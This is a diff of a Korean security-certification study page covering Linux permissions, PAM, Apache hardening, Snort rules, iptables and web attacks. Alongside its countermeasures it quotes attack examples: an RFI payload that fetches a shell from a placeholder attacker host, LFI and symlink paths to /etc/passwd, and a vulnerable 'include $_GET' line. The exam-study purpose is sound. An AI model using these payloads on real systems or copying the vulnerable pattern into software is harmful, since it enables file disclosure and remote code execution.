@@ -47,6 +47,9 @@ section{scroll-margin-top:150px}
 .tag{font-size:11px;font-weight:600;border-radius:4px;padding:0 5px;margin-left:5px;vertical-align:1px;background:var(--code);color:var(--mute)}
 .tag.t단,.tag.t서{background:var(--accbg);color:var(--acc)}
 .m{margin-top:5px;padding:7px 9px;border-left:3px solid var(--acc);background:var(--accbg);border-radius:0 6px 6px 0;font-size:14px}
+.memo{display:block;margin-top:4px;padding:8px 10px;background:var(--hi);border-left:3px solid var(--acc);border-radius:0 6px 6px 0;line-height:1.65}
+.toc a.hot{display:block;background:var(--hi);border:1px solid var(--acc);border-radius:8px;padding:8px 10px;margin:0 0 10px;font-weight:700;color:var(--ink)}
+.toc a.hot small{display:block;font-weight:400;margin-top:2px}
 </style>
 </head>
 <body>
@@ -104,7 +107,8 @@ const D=[
 [1,"SetUID 제거·검색 이유","<code>chmod -s</code> 특수비트 제거 · <code>find / -user root -type f \\( -perm -4000 -o -perm -2000 \\)</code> 검색 · 이유: root 소유 SetUID 파일은 일반 사용자가 실행해도 root 권한 → 악용 가능","서"],
 [1,"특수권한 해석 (passwd·mail·/tmp)","<code>-r-sr-xr-x root</code> SetUID → 누구나 root 권한으로 실행 · <code>-r-xr-sr-x mail</code> SetGID → mail 그룹 권한 · <code>drwxrwxrwt</code> Sticky → 누구나 쓰기, 삭제는 소유자·root만","서"],
 [0,"-rwxr-x--x 해석","소유자 rwx · 그룹 읽기·실행 · 기타 실행만","서"],
-[0,"백업 파일 권한 문제","644면 누구나 읽음(/etc/shadow 포함) → 백업 전 <code>umask</code> 강화 · 스크립트 <code>chown</code>·<code>chmod 700</code>","서"]
+[0,"백업 파일 권한 문제","644면 누구나 읽음(/etc/shadow 포함) → 백업 전 <code>umask</code> 강화 · 스크립트 <code>chown</code>·<code>chmod 700</code>","서"],
+[1, "ls -l 소유자 · 그룹 (root sys)", "<code>-rw-r--r-- 1 root sys 1024 /etc/passwd</code> = 소유자 <b>root</b>, 그룹 <b>sys</b> (누가 무슨 권한으로 실행되는지가 아님) · 소유자 rw- · sys 그룹 r-- · 기타 r-- · root 권한 실행은 <b>SetUID</b>일 때(<code>-rwsr-xr-x root</code>), 그룹 자리 s면 SetGID(그룹 권한) · 점검: passwd root·644 이하 · shadow root·400 이하 · hosts root·600 이하 · 조치 <code>chown root:sys 파일</code> <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["sys","PAM · 계정 잠금 · su",[
 [1,"PAM 설정 형식","<code>type  control  module  args</code> · 파일 <code>/etc/pam.d/서비스명</code> · 모듈 <code>/lib/security</code>"],
@@ -123,7 +127,8 @@ const D=[
 [1,"su 제한","<code>auth required pam_wheel.so use_uid</code> · <code>chgrp wheel /bin/su; chmod 4750 /bin/su</code>"],
 [1,"PAM 모듈 타입","<b>auth</b> 인증(패스워드 확인) · <b>account</b> 사용 권한 확인 · <b>session</b> 인증 후 세션","단"],
 [1,"계정 잠금 (pam_tally)","파일 <code>/etc/pam.d/system-auth</code>(common-auth) · <code>deny=5</code> 5회 실패 잠금 · <code>unlock_time=120</code> 120초 후 해제 · <code>no_magic_root</code> root 예외 · <code>reset</code> 성공 시 초기화","서"],
-[0,"리눅스 보안 설정 묶음","shadow <code>chown root</code>·<code>chmod 400</code> · <code>LimitRequestBody 5000000</code> 약 5MB 업로드 제한(웹쉘 방지)","서"]
+[0,"리눅스 보안 설정 묶음","shadow <code>chown root</code>·<code>chmod 400</code> · <code>LimitRequestBody 5000000</code> 약 5MB 업로드 제한(웹쉘 방지)","서"],
+[1, "/etc/pam.d/system-auth", "RHEL·CentOS 계열 <b>공통 인증 설정</b> 파일 · login·su·sshd가 include해서 같은 정책 사용 · Ubuntu는 <code>common-auth</code>·<code>common-password</code> · 줄 형식 <code>type control module 옵션</code> · 시험 단골: 계정 잠금 <code>auth required pam_faillock.so deny=5 unlock_time=600</code>(구 <code>pam_tally2.so</code>) · 복잡도 <code>pam_pwquality.so minlen=8 dcredit=-1 ...</code>(음수 = 최소 개수) · 재사용 금지 <code>pam_unix.so remember=5</code> · su 제한은 <code>/etc/pam.d/su</code>의 <code>pam_wheel.so use_uid</code> <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["sys","원격접속 · 서비스 통제 (TCP Wrapper·xinetd·cron)",[
 [1,"root 원격 접속 제한","telnet: <code>/etc/securetty</code>에서 <code>pts/*</code> 제거 + <code>pam_securetty.so</code> · SSH: <code>PermitRootLogin no</code>"],
@@ -200,7 +205,9 @@ const D=[
 [1,"strace · lsof","<b>strace</b> 시스템 콜 추적(트로이 목마 구분) · <b>lsof</b> 프로세스가 연 파일 목록(ps 변조 시 대안)","단"],
 [0,"strace 사용 예","<code>strace -e trace=open ps</code> → ps가 여는 파일 확인(트로이 목마 판별)","단"],
 [1,"삭제된 백도어 복구","<code>/proc/PID/exe -> (deleted)</code> = 실행 후 파일 삭제 · 복원 <code>cp /proc/5900/exe /tmp/backdoor</code> · 명령 확인 <code>history</code>, <code>cat /proc/PID/cmdline</code>","서"],
-[0,"10일 내 변경 파일 찾기","<code>find /etc/apache/conf -type f -mtime -10</code>","서"]
+[0,"10일 내 변경 파일 찾기","<code>find /etc/apache/conf -type f -mtime -10</code>","서"],
+[0, "vi 저장 · 종료", "<code>i</code> 입력 모드 → <code>Esc</code>(또는 <code>Ctrl+[</code>) 명령 모드(<code>-- INSERT --</code> 사라짐) → <code>:w</code> 저장 · <code>:q</code> 종료 · <code>:wq</code>/<code>:x</code> 저장 후 종료 · <code>:q!</code> 저장 안 하고 강제 종료 · <code>:wq!</code> 강제 저장 <span class='done'>채팅에서 다룸</span>"],
+[0, "vi E492 · E45", "<b>E492</b> Not an editor command = 모르는 명령 → 한글 입력(<code>:ㅈㅂ</code>)·공백(<code>: wq</code>)·<code>;wq</code> 확인, 영문으로 <code>:wq</code> · <b>E45</b> 'readonly' option is set = 쓰기 권한 없음(/etc는 root) → <code>:q!</code> 후 <code>sudo vi 파일</code>, 또는 <code>:w !sudo tee %</code> <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["sys","패치 · 패키지 관리",[
 [1,"apt update","저장소의 패키지 목록(인덱스)만 갱신 · 실제 설치·업그레이드 X"],
@@ -323,7 +330,7 @@ const D=[
 [1,"디렉터리 리스팅","<code>Options -Indexes</code>"],
 [1,"심볼릭 링크","<code>Options -FollowSymLinks</code>"],
 [1,"버전 노출","<code>ServerTokens Prod</code> · <code>ServerSignature Off</code>"],
-[1,"LimitRequestBody","클라이언트 요청 본문 최대 크기(바이트) · <code>LimitRequestBody 5000000</code> ≈ 5MB · 0 = 무제한(기본) · 대용량 업로드 DoS 방지 · <code>&lt;Directory&gt;</code> 안에 설정"],
+[1,"LimitRequestBody","클라이언트 요청 본문 최대 크기(바이트) · <code>LimitRequestBody 5000000</code> ≈ 5MB · 0 = 무제한(기본) · 대용량 업로드 DoS 방지 · <code>&lt;Directory&gt;</code> 안에 설정 · 초과하면 <b>413 Request Entity Too Large</b>로 거부 · 범위 0~2147483647(2GB), 0 = 무제한(2.4.53 이전 기본값) · 같이 나오는 것: <code>LimitRequestFields</code> 헤더 개수 · <code>LimitRequestFieldSize</code> 헤더 크기 · <code>LimitRequestLine</code> 요청 줄 길이 · <code>Timeout</code>(Slowloris 대응) <span class='done'>채팅에서 다룸</span>"],
 [1,"ModSecurity","Apache·Nginx·IIS용 오픈소스 WAF 모듈 · OWASP CRS(Core Rule Set) 사용 · <code>SecRuleEngine On</code>(차단) / <code>DetectionOnly</code>(탐지만) / <code>Off</code>"],
 [1,"SecRule 형식","<code>SecRule 변수 \"연산자\" \"액션\"</code> · 예 <code>SecRule ARGS \"@rx union.*select\" \"id:1001,phase:2,deny,status:403,msg:'SQLi'\"</code> · <code>SecRequestBodyAccess On</code> · <code>SecAuditLog</code>"],
 [1,"Options 지시자","<code>Indexes</code> 디렉터리 목록 · <code>FollowSymLinks</code> 심볼릭링크 · <code>ExecCGI</code> CGI 실행 · <code>Includes</code> SSI · <code>MultiViews</code> · <code>All</code> · 권장 <code>Options None</code> 또는 <code>-Indexes -FollowSymLinks</code>"],
@@ -339,7 +346,10 @@ const D=[
 [1,".htaccess 업로드 대응","<code>FilesMatch</code>로 스크립트 확장자 직접 호출 금지 · <code>AddType text/html .php ...</code>로 실행 불가 MIME 지정","서"],
 [1,"Apache 취약 설정","<code>Indexes</code> 디렉터리 리스팅 · <code>FollowSymLinks</code> 심볼릭 링크 접근 · <code>AllowOverride None</code> → 제거 또는 <code>-Indexes</code>·<code>-FollowSymLinks</code>","서"],
 [1,"디렉터리 리스팅 성공 판단","응답 <code>200 OK</code> + <code>Index of /</code> 페이지 → 성공","서"],
-[0,"Apache 옵션 의미","<code>Timeout 300</code> 300초 무응답 종료 · <code>MaxKeepAliveRequests 100</code> · <code>DirectoryIndex</code> 기본 파일 순서 · <code>ErrorLog</code> 경로","서"]
+[0,"Apache 옵션 의미","<code>Timeout 300</code> 300초 무응답 종료 · <code>MaxKeepAliveRequests 100</code> · <code>DirectoryIndex</code> 기본 파일 순서 · <code>ErrorLog</code> 경로","서"],
+[1, "Indexes · FollowSymLinks가 켜지면", "<b>Indexes</b>: index.html 없으면 폴더 <b>파일 목록</b> 노출 · 정상 용도 자료실·미러 사이트 · 악용 <code>/upload/</code> <code>/backup/</code>에서 .bak·.zip·.sql·설정 파일 수집, 구조 파악 · <b>FollowSymLinks</b>: 심볼릭 링크가 가리키는 실제 파일 제공 · 정상 용도 다른 폴더 연결 · 악용 <code>ln -s / /var/www/html/x</code> → <code>/x/etc/passwd</code> · 둘이 합쳐지면 링크로 시스템 폴더 목록까지 · KISA U-35 리스팅 제거, U-39 링크 금지 · 절충 <code>SymLinksIfOwnerMatch</code>(소유자 같을 때만) <span class='done'>채팅에서 다룸</span>"],
+[1, "&lt;Directory /&gt; vs &lt;Directory /var/www/&gt;", "<code>/</code> = 파일시스템 <b>전체</b>의 기본값 → <code>Require all denied</code>(Alias 실수로 웹 루트 밖이 열려도 /etc 노출 방지) · <code>/var/www/</code> = DocumentRoot 예외 → <code>Require all granted</code> · <b>더 구체적인 하위 경로가 우선</b> → 기본 차단 + 필요한 곳만 허용(iptables 기본 DROP과 같은 원리) · 구버전 <code>Order deny,allow</code> + <code>Deny from all</code> · Indexes·FollowSymLinks는 두 블록 다 점검 <span class='done'>채팅에서 다룸</span>"],
+[1, "안전한 Directory 설정 (답안)", "<code>&lt;Directory /&gt; Options None · AllowOverride None · Require all denied &lt;/Directory&gt;</code> · <code>&lt;Directory /var/www/&gt; Options -Indexes -FollowSymLinks · AllowOverride None · Require all granted &lt;/Directory&gt;</code> · 서술 답안: /var/www의 Options에서 Indexes를 제거해 디렉터리 리스팅을 차단하고, FollowSymLinks를 제거해 웹 루트 외부 파일 접근을 차단한다. 루트(/)는 Options None과 Require all denied로 기본 차단 · 함께 <code>ServerTokens Prod</code> <code>ServerSignature Off</code> <code>TraceEnable Off</code> <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["net","포트 · TCP/IP · ICMP",[
 [1,"주요 포트","20/21 FTP · 22 SSH · 23 Telnet · 25 SMTP · 53 DNS · 69 TFTP · 110 POP3 · 123 NTP · 143 IMAP · 161/162 SNMP · 389 LDAP · 443 · 445 SMB · 514 syslog · 3389 RDP"],
@@ -403,7 +413,9 @@ const D=[
 [1,"LAN 스위칭 방식","<b>Cut-through</b> 목적지 주소만 보고 전달 · <b>Fragment Free</b> 앞 64바이트 확인 · <b>Store and Forward</b> 전체 프레임 수신 후","단"],
 [1,"VLAN","보안·성능 향상, 브로드캐스트 도메인 축소 · <b>정적</b>(포트 기반, 수동) · <b>동적</b>(MAC 기반, 자동) · 포트·MAC·네트워크 주소·프로토콜 기반 · 확인 <code>show vlan</code>","단"],
 [0,"VLAN 효과","자원 사용 제한으로 <b>보안</b>↑ · 브로드캐스트 도메인 <b>크기</b> 제한 · 네트워크 <b>성능</b>↑","단"],
-[1,"스위칭 허브 동작","Learning(출발지 MAC 학습) · Forwarding · Filtering · Flooding(모르는 목적지) · Aging(타이머 후 삭제)","서"]
+[1,"스위칭 허브 동작","Learning(출발지 MAC 학습) · Forwarding · Filtering · Flooding(모르는 목적지) · Aging(타이머 후 삭제)","서"],
+[1, "스위치 동작 5가지", "MAC 주소 테이블 기준 · <b>Learning</b> 출발지 MAC + 들어온 포트 기록 · <b>Flooding</b> 목적지 MAC 모름·브로드캐스트 → 들어온 포트 빼고 전부 · <b>Forwarding</b> 아는 목적지 포트로만 · <b>Filtering</b> 목적지가 들어온 포트 쪽이면 버림 · <b>Aging</b> 미사용 항목 삭제(보통 <b>300초</b>) · MAC Flooding(<code>macof</code>)으로 테이블을 채우면 허브처럼 Flooding → 스니핑 · 대응 Port Security <span class='done'>채팅에서 다룸</span>"],
+[0, "MAC 테이블 Aging", "통신 중인 장비는 프레임이 올 때마다 Learning으로 타이머가 300초로 <b>리셋</b> → 안 사라짐 · 300초 동안 조용한 장비(꺼짐·포트 이동)만 삭제 · 이유: 옛 정보 정리, 테이블 용량 확보 · <b>Static MAC</b>(수동 등록, Port Security 고정)은 Aging 제외 · ARP 캐시(IP↔MAC, PC·라우터)와 구분: MAC 테이블은 MAC↔포트, 스위치에 있음 <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["net","스캐닝 (nmap)",[
 [1,"-sT","TCP Connect (3-way 완료, 로그 남음)"],
@@ -574,7 +586,12 @@ const D=[
 [0, "예) SMB · Log4Shell · NOP", "SMB <code>content:\"|00|\"; depth:1; content:\"|FF|SMB\"; offset:4; depth:5;</code> (MS17-010) · Log4Shell <code>content:\"${jndi:\"; nocase;</code> · NOP 슬레드 <code>content:\"|90 90 90 90|\";</code> · FTP root <code>-&gt; 21 (content:\"USER root\"; nocase;)</code> <span class='done'>채팅에서 다룸</span>"],
 [1, "Snort 실행 모드", "<b>스니퍼</b> <code>snort -v</code> 화면 출력 · <b>패킷 로거</b> <code>snort -l /var/log/snort</code> 파일 저장 · <b>NIDS</b> <code>snort -c snort.conf</code> 룰 탐지 · (+ <b>인라인</b> <code>snort -Q</code> IPS 차단) · 기본 3모드 = 스니퍼·패킷 로거·NIDS <span class='done'>채팅에서 다룸</span>"],
 [1, "IDS 모드 vs IPS 모드", "같은 Snort 프로그램 · <b>IDS</b> 미러링(SPAN)·TAP에 연결, 복사본만 봐서 탐지·경고만 · <b>IPS</b> 인라인(브리지)으로 패킷이 통과 → drop·reject·sdrop로 차단 · IDS 모드에서 drop 룰은 효과 없음 · 운영: 오탐 튜닝, 룰 업데이트, 관제 대응 필요 (IPS 오탐 = 정상 서비스 차단) <span class='done'>채팅에서 다룸</span>"],
-[0, "Snort 정체 · 보안장비", "오픈소스 <b>시그니처(오용) 기반 NIDS/NIPS</b> · 개발 Martin Roesch · Sourcefire → <b>Cisco</b>(Firepower에 탑재) · pfSense·Security Onion에서 사용 · 상용 IPS(안랩·윈스·Palo Alto·Fortinet)는 대부분 자체 엔진이나 Snort 문법 유사 → 룰 문제는 Snort 문법 <span class='done'>채팅에서 다룸</span>"]
+[0, "Snort 정체 · 보안장비", "오픈소스 <b>시그니처(오용) 기반 NIDS/NIPS</b> · 개발 Martin Roesch · Sourcefire → <b>Cisco</b>(Firepower에 탑재) · pfSense·Security Onion에서 사용 · 상용 IPS(안랩·윈스·Palo Alto·Fortinet)는 대부분 자체 엔진이나 Snort 문법 유사 → 룰 문제는 Snort 문법 <span class='done'>채팅에서 다룸</span>"],
+[1, "Snort 룰 조회", "iptables <code>-L</code> 같은 전용 명령 <b>없음</b> → 룰은 텍스트 파일 · <code>cat /etc/snort/rules/local.rules</code>(사용자 룰, sid 1,000,000 이상) · 불러오는 룰 파일 <code>grep include /etc/snort/snort.conf</code> · <code>snort -T -c /etc/snort/snort.conf</code> = 설정·룰 문법 검사 + 로딩된 룰 개수 · 현재 룰 목록 명령은 iptables <code>iptables -L -n -v --line-numbers</code> <span class='done'>채팅에서 다룸</span>"],
+[1, "Snort 룰 등록 절차", "① <code>sudo vi /etc/snort/rules/local.rules</code> ② 한 줄 추가 <code>alert icmp any any -&gt; $HOME_NET any (msg:\"ICMP Ping Detected\"; itype:8; sid:1000001; rev:1;)</code>(sid 겹치면 안 됨) ③ snort.conf에 <code>include $RULE_PATH/local.rules</code>(주석이면 해제)·<code>ipvar HOME_NET 192.168.1.0/24</code> 확인 ④ <code>snort -T -c /etc/snort/snort.conf</code> → \"Snort successfully validated the configuration!\" ⑤ <code>snort -A console -q -c /etc/snort/snort.conf -i eth0</code> ⑥ 룰을 바꾸면 <b>재시작</b>해야 반영 <span class='done'>채팅에서 다룸</span>"],
+[1, "Snort 경고 출력 해석", "<code>11/06-14:36:50 [**] [1:1000001:1] ICMP Ping Detected [**] [Priority: 0] {ICMP} 192.168.1.20 -&gt; 192.168.1.10</code> · <code>[1:1000001:1]</code> = <b>[GID:SID:REV]</b>(GID 1 = 일반 룰) · <code>-A fast</code>로 실행하면 <code>/var/log/snort/alert</code>에 한 줄씩 → <code>tail -f /var/log/snort/alert</code> <span class='done'>채팅에서 다룸</span>"],
+[0, "Snort 실행 옵션", "<code>-c</code> 설정 파일 · <code>-T</code> 설정 테스트 · <code>-A</code> 경고 모드(fast·full·console) · <code>-l</code> 로그 디렉터리 · <code>-i</code> 인터페이스 · <code>-q</code> 배너 생략 · <code>-v</code> 스니퍼 · <code>-Q</code> 인라인 <span class='done'>채팅에서 다룸</span>"],
+[0, "Snort에 '들어가서' 룰 추가?", "X · 대화형 콘솔 없음 → <b>파일 편집 후 재시작</b>(시작할 때 파일을 읽어 메모리에 올림) · iptables는 셸에서 명령 즉시 적용 · Cisco 라우터는 <code>configure terminal</code> 설정 모드 진입 · 상용 IPS는 웹 GUI가 내부적으로 파일에 씀 <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["net","iptables · 패킷 필터링",[
 [1,"기본 구조","<code>iptables -A INPUT -s 1.2.3.4 -p tcp --dport 22 -j DROP</code>"],
@@ -584,7 +601,7 @@ const D=[
 [1,"상태 추적","<code>-m state --state ESTABLISHED,RELATED -j ACCEPT</code>"],
 [1,"동시 연결 제한","<code>-m connlimit --connlimit-above 10 -j DROP</code>"],
 [0,"속도 제한","<code>-m limit --limit 1/s --limit-burst 5</code>"],
-[0,"SYN 패킷","<code>--syn</code> 또는 <code>--tcp-flags SYN,ACK,FIN,RST SYN</code>"],
+[0,"SYN 패킷","<code>--syn</code> 또는 <code>--tcp-flags SYN,ACK,FIN,RST SYN</code> · <b>--syn</b> = SYN만 1이고 RST·ACK·FIN은 0 = 3-way handshake <b>첫 패킷</b>(새 연결 요청) · SYN Flooding 완화 <code>-A INPUT -p tcp --syn -m limit --limit 10/s -j ACCEPT</code> 다음 <code>-A INPUT -p tcp --syn -j DROP</code>(이미 연결된 ACK 패킷엔 영향 없음) · 외부발 새 연결만 차단 <code>-A INPUT -p tcp --syn -j DROP</code> · <code>! --syn</code> = 연결 이후 패킷 · Snort에선 <code>flags:S</code> <span class='done'>채팅에서 다룸</span>"],
 [1,"iptables 체인","<b>INPUT</b> 방화벽이 목적지 · <b>FORWARD</b> 경유 · <b>OUTPUT</b> 방화벽이 출발지","서"],
 [1,"iptables SYN 임계 차단","<code>iptables -A INPUT -p tcp --syn --dport 80 -m recent --update --seconds 2 --hitcount 30 --name SYN_DROP -j DROP</code>","서"],
 [0,"iptables Faked NEW","<code>! --syn -m state --state NEW -j LOG</code> = SYN이 아닌 NEW 패킷을 로그로","서"],
@@ -595,7 +612,13 @@ const D=[
 [1, "룰 순서 · 기본 정책", "<b>위에서부터</b> 검사, <b>처음 맞는 룰</b>에서 결정 → <code>-A</code>(뒤)와 <code>-I</code>(앞) 차이가 중요 · 안 맞으면 기본 정책(<code>-P</code>) · 보안 원칙: <b>기본 DROP + 필요한 것만 ACCEPT</b>(화이트리스트) <span class='done'>채팅에서 다룸</span>"],
 [1, "화이트리스트 예", "<code>-P INPUT DROP</code> → <code>-A INPUT -i lo -j ACCEPT</code> → <code>-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</code> → <code>-A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT</code> → <code>-A INPUT -p tcp --dport 80 -j ACCEPT</code> <span class='done'>채팅에서 다룸</span>"],
 [0, "예) Ping 차단 · SYN 제한 · NAT", "<code>-A INPUT -p icmp --icmp-type echo-request -j DROP</code> · <code>-A INPUT -p tcp --syn -m limit --limit 10/s -j ACCEPT</code> · <code>-t nat -A POSTROUTING -o eth0 -j MASQUERADE</code>(내부망 공인 IP 공유) <span class='done'>채팅에서 다룸</span>"],
-[1, "iptables vs Snort", "iptables = IP·포트·상태(<b>헤더</b>)로 판단하는 <b>방화벽</b> · Snort = <b>페이로드 내용</b>까지 보는 <b>IDS/IPS</b> <span class='done'>채팅에서 다룸</span>"]
+[1, "iptables vs Snort", "iptables = IP·포트·상태(<b>헤더</b>)로 판단하는 <b>방화벽</b> · Snort = <b>페이로드 내용</b>까지 보는 <b>IDS/IPS</b> <span class='done'>채팅에서 다룸</span>"],
+[1, "체인 · 테이블 정리", "<b>filter</b>(기본): INPUT 들어옴 · OUTPUT 나감 · FORWARD 경유 · <b>nat</b>: PREROUTING(라우팅 전, <b>DNAT</b>·포트포워딩) · POSTROUTING(라우팅 후, <b>SNAT</b>·MASQUERADE) · OUTPUT · <b>mangle</b>: 5개 체인 모두(TTL·TOS 수정) · <code>-N 이름</code> 사용자 체인 · 흐름: 들어옴 PREROUTING→INPUT · 나감 OUTPUT→POSTROUTING · 경유 PREROUTING→FORWARD→POSTROUTING <span class='done'>채팅에서 다룸</span>"],
+[0, "예) OUTPUT · FORWARD · DNAT", "<code>-A OUTPUT -p tcp --dport 25 -j DROP</code> 서버에서 외부로 메일 발송 차단(스팸 발송 방지) · <code>-A FORWARD -s 192.168.1.0/24 -j ACCEPT</code> 내부망 중계 · <code>-t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to 192.168.1.10:80</code> 포트포워딩 <span class='done'>채팅에서 다룸</span>"],
+[1, "예) 조회 · 삭제 · 서비스 · 대역", "<code>-L -n --line-numbers</code> 번호와 목록 · <code>-D INPUT 3</code> 3번 삭제 · <code>-F</code> 전체 삭제 · <code>-m multiport --dports 80,443 -j ACCEPT</code> · <code>--dport 23 -j DROP</code> Telnet 차단 · <code>--dport 21 -j REJECT</code> · <code>-I INPUT 1 -s 10.0.0.0/8 -j DROP</code> 1번 자리 삽입 · <code>-A INPUT ! -s 192.168.10.0/24 -p tcp --dport 22 -j DROP</code> 관리 대역 외 SSH 차단 <span class='done'>채팅에서 다룸</span>"],
+[1, "예) DoS · 스캔 · 문자열", "<code>--syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT</code> SYN Flooding 완화 · <code>--dport 80 -m connlimit --connlimit-above 30 -j DROP</code> IP당 동시 연결 · <code>--dport 80 -m recent --update --seconds 1 --hitcount 20 -j DROP</code> GET Flooding(앞에 <code>-m recent --set</code> 룰 필요) · <code>--tcp-flags ALL NONE -j DROP</code> NULL 스캔 · <code>--tcp-flags ALL FIN,URG,PSH -j DROP</code> XMAS 스캔 · <code>-m string --string \"cmd.exe\" --algo bm -j DROP</code> L7 문자열 · <code>-p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT</code> <span class='done'>채팅에서 다룸</span>"],
+[1, "LOG 후 DROP · 저장", "<code>-A INPUT -p tcp --dport 23 -j LOG --log-prefix \"TELNET_TRY: \"</code> 다음 줄 <code>-j DROP</code> · <b>LOG는 기록만 하고 다음 룰로 넘어감</b> → 차단 룰 따로 필요 · 위에서 ACCEPT된 패킷은 아래 DROP까지 안 감 · 저장 <code>iptables-save &gt; /etc/sysconfig/iptables</code> · 복원 <code>iptables-restore</code> <span class='done'>채팅에서 다룸</span>"],
+[1, "iptables = 인라인", "커널 netfilter의 <b>패킷 경로 위</b>에서 ACCEPT·DROP 결정 → 실제 차단 O · L3/L4(IP·포트·플래그) 위주 · Snort IDS 모드 = 복사본 감시(alert만) · Snort 인라인 <code>-Q</code> = drop 가능, L7 페이로드 · 같이 쓰기: iptables <code>-j NFQUEUE</code>로 인라인 Snort에 패킷 전달 <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["net","보안 솔루션 (IDS·SIEM·DLP·EDR·NAC)",[
 [1,"인라인 (In-line)","트래픽 경로에 직렬 배치 · 실시간 차단 가능(IPS·방화벽·WAF) · 장애 시 네트워크 단절 위험 → Bypass(Fail-open) 기능 · 지연 발생"],
@@ -750,8 +773,8 @@ const D=[
 [1,"웹쉘 탐지","업로드 디렉터리의 .php 요청 · 로그의 <code>?cmd=</code> 파라미터 · 최근 변경파일 <code>find /var/www -mtime -1 -name \"*.php\"</code> · KISA 휘슬(WHISTL)"],
 [1,"웹쉘 대응 (Apache)","업로드 디렉터리 실행 차단 <code>&lt;Directory /upload&gt; php_admin_flag engine off</code> 또는 <code>&lt;FilesMatch \"\\.(php|jsp)$\"&gt; Require all denied</code> · 웹 루트 밖에 저장"],
 [1,"Directory Traversal","<code>../../etc/passwd</code> · 대응 경로 문자 필터링"],
-[1,"include / require","PHP에서 다른 파일을 불러와 실행 · include: 실패 시 경고 후 계속 · require: 실패 시 치명적 오류로 중단 · <code>_once</code>는 한 번만"],
-[1,"파일 인클루전 (LFI/RFI)","파라미터를 include에 그대로 사용 · LFI <code>?page=../../etc/passwd</code> · RFI <code>?page=http://공격자/shell.txt</code>(원격 코드 실행)"],
+[1,"include / require","PHP에서 다른 파일을 불러와 실행 · include: 실패 시 경고 후 계속 · require: 실패 시 치명적 오류로 중단 · <code>_once</code>는 한 번만 · 예 <code>include \"header.php\";</code> <code>require \"db_config.php\";</code> 공통 헤더·DB 설정 불러오기 <span class='done'>채팅에서 다룸</span>"],
+[1,"파일 인클루전 (LFI/RFI)","파라미터를 include에 그대로 사용 · LFI <code>?page=../../etc/passwd</code> · RFI <code>?page=http://공격자/shell.txt</code>(원격 코드 실행) · 취약 코드 <code>include $_GET['page'];</code> · 대응 <code>allow_url_include = Off</code>·<code>allow_url_fopen = Off</code>, include 대상 화이트리스트, <code>../</code>·<code>http://</code> 필터링, <code>open_basedir</code> · 로그 파라미터에 <code>../</code>나 <code>http://</code>가 보이면 LFI/RFI 의심 <span class='done'>채팅에서 다룸</span>"],
 [1,"php.ini 보안 설정","<code>allow_url_include = Off</code>(RFI 차단) · <code>allow_url_fopen = Off</code> · <code>display_errors = Off</code> · <code>expose_php = Off</code> · <code>register_globals = Off</code>(구버전)"],
 [1,"php.ini 추가 설정","<code>disable_functions = system,exec,shell_exec,passthru,popen</code> · <code>open_basedir = /var/www</code> 접근 경로 제한 · <code>session.cookie_httponly = 1</code> · <code>file_uploads</code>·<code>upload_max_filesize</code>"],
 [0,"파일 업로드 공격 · SQL Injection","실행 가능한 스크립트 첨부로 원격 제어 = 파일 업로드 공격 · 질의문 삽입 = SQL Injection","단"],
@@ -789,7 +812,8 @@ const D=[
 [0,"HTTP Request Smuggling","Content-Length·Transfer-Encoding 조작으로 백엔드에 몰래 요청","단"],
 [1,"웹 프록시","HTTP/HTTPS 요청·응답 가로채 수정 · Paros, Burp Suite, ZAP","단"],
 [1,"쿠키 보안 속성","<b>Secure</b> HTTPS일 때만 전송(스니핑 대응) · <b>HttpOnly</b> JS 접근 차단(XSS 대응) · <b>Expires</b> 만료로 재사용 위험 감소","서"],
-[0,"robots.txt 해석","<code>Allow: /</code> 전체 허용 · <code>Disallow: /admin/</code> · <code>Disallow: /*.pdf$</code> pdf 금지","서"]
+[0,"robots.txt 해석","<code>Allow: /</code> 전체 허용 · <code>Disallow: /admin/</code> · <code>Disallow: /*.pdf$</code> pdf 금지","서"],
+[1, "Expires · Max-Age", "<code>Set-Cookie: SESSIONID=abc123; Expires=Wed, 11 Nov 2026 09:00:00 GMT; Path=/; Secure; HttpOnly; SameSite=Strict</code> · <b>Expires</b> = 쿠키 만료 일시 · 없으면 <b>세션 쿠키</b>(브라우저 닫으면 삭제) · 있으면 <b>영속 쿠키</b>(디스크 저장, 만료일까지) · <code>Max-Age=3600</code> 초 단위 상대 시간, Expires보다 <b>우선</b> · <code>Domain</code>·<code>Path</code> 전송 범위 · 보안 속성 Secure(HTTPS만) · HttpOnly(JS 차단, XSS) · SameSite Strict/Lax/None(CSRF) · 세션 ID에 긴 Expires는 탈취 시 오래 악용 → 짧게 또는 세션 쿠키 <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["app","OWASP · 시큐어코딩",[
 [0,"불완전한 암호화 저장 점검","DB 중요정보를 <b>SQL Query</b>로 평문 열람 가능한지 · <b>세션 ID</b> 랜덤성 · <b>암호화 알고리즘</b> 적정성","단"],
@@ -833,7 +857,19 @@ const D=[
 [1,"PGP","필 짐머만 · 이메일 보안 · 공개 구현으로 널리 사용","단"],
 [1,"Sendmail 릴레이 제한","<code>sendmail.cf</code>의 Relaying denied · access 파일 <code>RELAY</code> 허용 · <code>REJECT</code> 거부 · <code>DISCARD</code> 폐기 · DB 생성 <code>makemap hash /etc/mail/access.db &lt; /etc/mail/access</code>","단"],
 [0,"메일 헤더의 ECDHE 서명","키 교환 값(ECDHE)을 서버 개인키로 서명 → 공개키로 검증해 송신 서버 인증, 중간자 공격 방지","서"],
-[1,"SPF · DKIM · DMARC","<b>SPF</b> DNS TXT의 허용 IP와 발신 IP 비교 · <b>DKIM</b> 발신 서버 개인키로 헤더 서명, DNS 공개키로 검증 · 둘을 묶은 정책 <b>DMARC</b>","서"]
